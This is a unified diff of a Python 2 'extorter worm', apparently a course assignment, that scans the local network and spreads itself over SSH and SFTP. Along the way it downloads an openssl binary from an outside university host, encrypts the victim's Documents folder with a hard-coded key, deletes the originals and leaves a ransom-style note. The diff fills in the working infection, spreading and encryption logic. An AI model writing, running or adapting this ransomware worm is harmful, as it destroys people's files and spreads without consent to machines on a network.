@@ -20,7 +20,7 @@ credList = [
 
 
 # Path of directory we want to encrypt
-ENCRYPT_PATH = "/home/linh/"
+ENCRYPT_PATH = os.getenv("HOME")
 
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
@@ -59,7 +59,7 @@ def markInfected():
 # Leave a note
 #################################################################
 def leaveNote():
-	os.chdir(ENCRYPT_PATH)
+	os.chdir(ENCRYPT_PATH + '/Desktop')
 	file = open("note.txt", 'w')
 	file.write("Hey! your Documents folder has been encrypted.")
 	file.close()
@@ -73,19 +73,15 @@ def downloadAndEncrypt(path):
 	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl","openssl")
 	# create a tar
 	createTar(path)
-	# encrypt that tar
+	# encrypt the tar
 	call(["chmod", "a+x", "./openssl"])
-	call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "Documents.tar", "-out", "Documents.tar.enc", "-k", "cs456worm"])
-	
-	# delete the original directory
-	try:
-		shutil.rmtree(path+"/Documents")
-	except OSError, e:
-		print ("Error: %s - %s." % (e.filename,e.strerror))
-	
-	# remove the Documents.tar and openssl
-	os.remove("Documents.tar")
-	os.remove("openssl")
+	call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "Document.tar", "-out", "Document.tar.enc", "-k", "cs456worm"])
+	#Copies encrypted file to Desktop
+	os.rename("Document.tar.enc", path + "/Desktop/Document.tar.enc")
+	#Delete the original directory
+	shutil.rmtree(path + "/Documents/")
+	#Delete the original tar that we used to ecrypt
+	os.remove('Document.tar')
 	leaveNote()
 
 
@@ -95,7 +91,7 @@ def downloadAndEncrypt(path):
 def createTar(path):
 	# Open the specified archive file (e.g. exdir.tar).
 	# If the archive does not already exit, create it.
-	tar = tarfile.open("Documents.tar","w:gz")
+	tar = tarfile.open("Document.tar","w:gz")
 
 	# Add the exdir/ directory to the archive
 	tar.add(path + "/Documents/")
@@ -107,14 +103,16 @@ def createTar(path):
 ###############################################################
 # Spread to the other system and execute
 # @param sshClient - the instance of the SSH client connected
+# @param IP, - the IP of the attacker to be passed as system argument so that we do not attack.
 # to the victim system
 ###############################################################
-def spreadAndExecute(sshClient):
+def spreadAndExecute(sshClient, IP):
 	
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put("extorter_worm.py", "/tmp/extorter_worm.py")
 	sshClient.exec_command("chmod a+x /tmp/extorter_worm.py")
-	sshClient.exec_command("python /tmp/extorter_worm.py 2> error.txt")
+	sshClient.exec_command("python /tmp/extorter_worm.py " + IP + " 2> errors.txt")
+	#downloadAndEncrypt(ENCRYPT_PATH)
 
 	# This function takes as a parameter 
 	# an instance of the SSH class which
@@ -219,11 +217,8 @@ def attackSystem(host):
 
 ####################################################
 # Returns the IP of the current system
-# @param interface - the interface whose IP we would
-# like to know
 # @return - The UP address of the current system
 ####################################################
-#def getMyIP(interface):
 def getMyIP():
 	for interface in netinfo.list_active_devs():
 		if not interface.startswith('lo'):
@@ -267,37 +262,28 @@ def getHostsOnTheSameNetwork():
 	return liveHosts
 
 
-# If we are being run without a command line parameters, 
-# then we assume we are executing on a victim system and
-# will act maliciously. This way, when you initially run the 
-# worm on the origin system, you can simply give it some command
-# line parameters so the worm knows not to act maliciously
-# on attackers system. If you do not like this approach,
-# an alternative approach is to hardcode the origin system's
-# IP address and have the worm check the IP of the current
-# system against the hardcoded IP. 
-if len(sys.argv) < 2:
-	
-	# TODO: If we are running on the victim, check if 
-	# the victim was already infected. If so, terminate.
-	# Otherwise, proceed with malice.
+networkHosts = getHostsOnTheSameNetwork()
+print(getMyIP())
+print(networkHosts)
+
+#We can tell if we are an attacker with the system arguments.  If there are no sys arg
+#we know that we are the attacker and remove ourself from the list of networkHost and set IP to ourself
+if len(sys.argv) == 1:
+	IP = getMyIP()
+	networkHosts.remove(IP)
+#Else if # of arguments is 2, we will remove the attacker's ip (from sys.argument) and the victim's IP
+elif len(sys.argv) == 2:
 	if isInfectedSystem() == True: 
 		sys.exit()
 	else:
 		markInfected()
-		downloadAndEncrypt(ENCRYPT_PATH)	
-# TODO: Get the IP of the current system
+		IP = sys.argv[1]
+		networkHosts.remove(getMyIP())
+		networkHosts.remove(sys.argv[1])
+		downloadAndEncrypt(ENCRYPT_PATH)
 
 
-# Get the hosts on the same network
-networkHosts = getHostsOnTheSameNetwork()
-print(getMyIP())
-print(networkHosts)
-networkHosts.remove(getMyIP())
-# TODO: Remove the IP of the current system
-# from the list of discovered systems (we
-# do not want to target ourselves!).
-
+#Prints Found Hosts
 print "Found hosts: ", networkHosts
 
 
@@ -315,6 +301,8 @@ for host in networkHosts:
 		
 		print "Trying to spread"
 		
+		#The worm will check if the system has been infected by retrieving the infected.txt. 
+		#It will give an IOError if the file does not exist, therefore we will sftp.put the worm on their system.
 		try:
 			remotepath = '/tmp/infected.txt'
 			localpath = os.getenv("HOME") + '/infected.txt'
@@ -326,36 +314,8 @@ for host in networkHosts:
 			print e
 			print "Attacking: ", host
 			print "This system should be infected"
-			spreadAndExecute(sshInfo[0])
+			spreadAndExecute(sshInfo[0], IP)
 			sys.exit()
-
-		# TODO: Check if the system was	
-		# already infected. This can be
-		# done by checking whether the
-		# remote system contains /tmp/infected.txt
-		# file (which the worm will place there
-		# when it first infects the system)
-		# This can be done using code similar to
-		# the code below:
-		# try:
-        	#	 remotepath = '/tmp/infected.txt'
-		#        localpath = '/home/cpsc/'
-		#	 # Copy the file from the specified
-		#	 # remote path to the specified
-		# 	 # local path. If the file does exist
-		#	 # at the remote path, then get()
-		# 	 # will throw IOError exception
-		# 	 # (that is, we know the system is
-		# 	 # not yet infected).
-		# 
-		#        sftp.get(filepath, localpath)
-		# except IOError:
-		#       print "This system should be infected"
-		#
-		#
-		# If the system was already infected proceed.
-		# Otherwise, infect the system and terminate.
-		# Infect that system
 				
 		print "Spreading complete"	
 	
